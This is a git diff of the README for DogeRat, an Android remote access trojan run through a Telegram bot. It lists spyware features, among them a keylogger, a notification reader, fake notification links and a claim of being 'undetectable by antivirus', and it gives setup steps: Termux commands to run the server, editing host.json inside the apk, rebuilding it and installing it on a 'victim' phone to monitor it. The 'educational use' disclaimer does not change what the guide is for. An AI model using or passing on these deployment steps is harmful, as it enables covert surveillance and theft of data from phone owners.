@@ -1,17 +1,18 @@
 ![Logo](https://dogelina.com/dogs/logo.png)
+<p align="center">
+  <i>A multifunctional Telegram based Android RAT without port forwarding</i>
+</p>
 
-[![instagram](https://img.shields.io/badge/CONTACT-TELEGRAM-blue)](https://t.me/CyberShieldX)
-[![instagram](https://img.shields.io/badge/CONTACT-INSTAGRAM-red)](https://instagram.com/CyberShieldX)
 
-#                     DOGERAT
 
-A multifunctional Telegram based Android RAT  without port forwarding.
-- VIDEO TUTORIALS  AVIALBLE HERE
-https://shivaya-dav.github.io/dogeweb/
-## Panel Screenshot
-![Logo](https://dogelina.com/dogs/scr.jpg)
+<h2 align="center">Panel Screenshot</h2>
+<p align="center">
+  <img src="https://dogelina.com/dogs/scr.jpg" alt="Logo" />
+</p>
+
+
 ## Features
- - 🔴 Real time
+- 🔴 Real time
 - 🌐 custom web view
 - 🔔 notification reader
 - 🔔 notification sender (send custom notification that apper on target device with custom click link)
@@ -33,83 +34,140 @@ https://shivaya-dav.github.io/dogeweb/
 - 🔐 Keylogger {Availbe in apk v1 and v2}
 - ✨ Beautiful telegram bot interface
 -🤖 Undetectable by antivirus
-## Requirements
- - Glitch Account
- - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
-[ApkTool Editor](https://dogelina.com/dogs/apkeditor.apk) ( for Android)
+<h2>Requirements</h2>
+<ul>
+  <li><span style="color: #0074D9;">APK EDITOR</span></li>
+  <li><span style="color: #2ECC40;">TERMUX</span></li>
+  <li>For hosting server code, you can use some free services like:</li>
+  <ul>
+    <li><a href="https://replit.com/" style="color: #FF4136;">replit.com</a></li>
+    <li><a href="https://glitch.com/" style="color: #FFDC00;">glitch.com</a></li>
+    <li><a href="https://heroku.com/" style="color: #B10DC9;">heroku.com</a></li>
+  </ul>
+  <p align="center">
+  <a href="https://shivaya-dav.github.io/dogeweb/">
+    <img src="https://img.shields.io/badge/📹%20VIDEO%20TUTORIALS%20AVAILABLE%20HERE-blue?style=for-the-badge" alt="Video Tutorials Available Here" />
+  </a>
+</p>
+  <li>Keep in mind that these sites can suspend your projects, so it's better to host on your own computer.</li>
+  
+</ul>
+
+<h2 align="center">Download</h2>
+
+<p align="center">
+  <a href="https://cybershieldx.com/termux.apk">
+    <img src="https://img.shields.io/badge/Termux%20Download-Click%20to%20Download-brightgreen?style=for-the-badge&logo=android" alt="Download Termux" />
+  </a>
+  <a href="https://cybershieldx.com/editor.apk">
+    <img src="https://img.shields.io/badge/APK%20Editor%20Download-Click%20to%20Download-brightgreen?style=for-the-badge&logo=android" alt="Download APK Editor" />
+  </a>
+</p>
+
+
+## How to host server in Termux 
+<p>Run the following commands in Termux:</p>
 
 
 
-NOTE : USE APK V1 AND V2 WITH OLD SERVER CODE
+```bash  
+  pkg update && upgrade -y
+  pkg install git -y
+  git clone https://github.com/shivaya-dav/DogeRat 
+  cd DogeRat
+  bash start.sh
+Enter your bot token 
+Enter your chatid 
+And hit enter
+Now open a new Tab, and give these commands
+pkg install openssh
+bash port.sh 
+Enter your telegram username And hit enter 
+Copy url and minimize the termux
+```
 
-## How to use
-- Search  BotFather on Telegram
-![App Screenshot](https://dogelina.com/dogs/1.jpg)
-- Creat a bot with any name/username
-![App Screenshot](https://dogelina.com/dogs/2.jpg)
-- Copy your Bot token
-![App Screenshot](https://dogelina.com/dogs/3.jpg)
-- Go to glitch.com click
-- new project then glitch-hello-node
-![App Screenshot](https://dogelina.com/dogs/4.jpg)
-- Delete all pre-available files {clcik on 3 dots}
-- click on files and upload package.json, server.js
-![App Screenshot](https://dogelina.com/dogs/5.jpg)
-- Paste your bot token in line 16 {beetwen ''}
-![App Screenshot](https://dogelina.com/dogs/6.jpg)
-- Paste your chat id in line 15 
-- (search userinfobot on telegram and send any msg you will
-- get your chatid
-![App Screenshot](https://dogelina.com/dogs/7.jpg)
-- click on previvew availble on bottom
-- open in new window
-![App Screenshot](https://dogelina.com/dogs/8.png)
-- if you see this type then copy url and close all tabs
-![App Screenshot](https://dogelina.com/dogs/9.jpg)
-- now open Apkeditor select apk 
-- go to following directory
-![App Screenshot](https://dogelina.com/dogs/10.jpg)
-![App Screenshot](https://dogelina.com/dogs/11.jpg)
-- paste your glitch url 
+## Edit apk
+ - Open Apk editor 
+ - select apk
+ - choose full edit
+ - select decode all files
+ - go to assets folder
+ - open host.json
+ - and enter url
+ - in socket replace url https to wss 
+ - build apk ,start the bott  Enjoy
+
+## example
 ```bash  
   { 
-  "host": "https://xxxx.glitch.me/", 
-  "socket": "wss://xxxx.glitch.me/", 
+  "host": "https://yoururl.com/", 
+  "socket": "wss://yoururl.com/", 
   "webView": "https://google.com/" 
 }
 ```
-- note: In webview you can add any website 
-- when victim will open apk given website will be open in apk
-- must replace https to wss
-- click on save, and go back
-![App Screenshot](https://dogelina.com/dogs/12.jpg)
-- clcik on smail and wait 3/4 second
-- Now build the apk
-- and install in any phone
-![App Screenshot](https://dogelina.com/dogs/13.jpg)
-- now go to BotFather clcik on your botusername
- - start your bot 
- - now you can monitor all device who will install the apk
-![App Screenshot](https://dogelina.com/dogs/15.jpg)
-
-### ❤️Thank you Supporters❤️
-[![Stargazers repo roster for @shivaya-dav/DogeRat](https://reporoster.com/stars/dark/shivaya-dav/DogeRat)](https://github.com/shivaya-dav/DogeRat/stargazers)
-## 🔗 CONTACT
-[![instagram](https://img.shields.io/badge/CONTACT-TELEGRAM-blue)](https://t.me/CyberShieldX)
-[![instagram](https://img.shields.io/badge/CONTACT-INSTAGRAM-red)](https://instagram.com/CyberShieldX)
 
 
-## Disclaimer
+<h2 align="center">🔗 Contact and Social Media Accounts</h2>
 
-Devolper Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.
-Dogerat is built for both Educational and Internal use ONLY.
-- Make sure the instagram username is @shvaya.dav and Telegram shivaya_dav beware from scam
+<p align="center">
+  <a href="https://t.me/CyberShieldX">
+    <img src="https://img.shields.io/badge/CONTACT-TELEGRAM-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
+  </a>
+  <a href="https://instagram.com/CyberShieldX">
+    <img src="https://img.shields.io/badge/CONTACT-INSTAGRAM-red?style=for-the-badge&logo=instagram" alt="Instagram Badge"/>
+  </a>
+  <a href="https://twitter.com/CyberShieldX">
+    <img src="https://img.shields.io/badge/CONTACT-TWITTER-blue?style=for-the-badge&logo=twitter" alt="Twitter Badge"/>
+  </a>
+  <a href="https://www.youtube.com/channel/UCIQVMD1wD0M02V2JbVP_KrA">
+    <img src="https://img.shields.io/badge/CONTACT-YOUTUBE-red?style=for-the-badge&logo=youtube" alt="Youtube Badge"/>
+  </a>
+</p>
+
+
+<p align="center">
+  <img src="https://img.shields.io/badge/Disclaimer-Important-red" alt="Important Disclaimer"/>
+</p>
+
+<p align="center">
+  <b><i>Note:</i></b> The developer provides no warranty with this software and will not be responsible for any direct or indirect damage caused by the usage of this tool. Dogerat is built for educational and internal use only.
+</p>
+
+<p align="center">
+  <b><i>Attention:</i></b> We do not endorse any illegal or unethical use of this tool. The user assumes all responsibility for the use of this software.
+</p>
+
+<p align="center">
+  <b><i>Important:</i></b> To prevent any fraudulent activity, please ensure that the Instagram username is <a href="https://instagram.com/CyberShieldX"><code>@CYBERSHIELDX</code></a> and the Telegram handle is <a href="https://t.me/CyberShieldX"><code>@CYBERSHIELDX</code></a>. Beware of scams and phishing attempts that use similar usernames or handles.
+</p>
+
+<p align="center">
+  <b><i>Thank you for using Dogerat - we hope it serves its intended purpose and helps you achieve your goals!</i></b>
+</p>
 
 
 
-## ALCOHOL SUPPORT 
-!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)
-- Bitcoin
-- 1LeLwYyDHu51875aenZaNcEnMrEbHwEKJd
-- Usdt trc20
-- TWX456AoupoYKwCYUKk3ZMWJtNJZRRHnrp
+
+<h2 align="center">🍻  Support 🍻</h2>
+
+<p align="center">
+  <a href="https://www.buymeacoffee.com/yourusername">
+    <img src="https://img.shields.io/badge/-Buy%20Me%20a%20Coffee-orange?style=for-the-badge&logo=buy-me-a-coffee&logoColor=white" alt="Buy Me A Coffee"/>
+  </a>
+</p>
+
+<p align="center">Support this project with cryptocurrency:</p>
+
+<p align="center">
+  Bitcoin: 1LeLwYyDHu51875aenZaNcEnMrEbHwEKJd<br>
+  USDT TRC20: TWX456AoupoYKwCYUKk3ZMWJtNJZRRHnrp
+</p>
+
+
+<h3 align="center">❤️ Thank you Supporters ❤️</h3>
+
+<p align="center">
+  <a href="https://github.com/shivaya-dav/DogeRat/stargazers">
+    <img src="https://img.shields.io/github/stars/shivaya-dav/DogeRat?style=for-the-badge&color=yellow" alt="Stargazers repo roster on GitHub"/>
+  </a>
+</p>
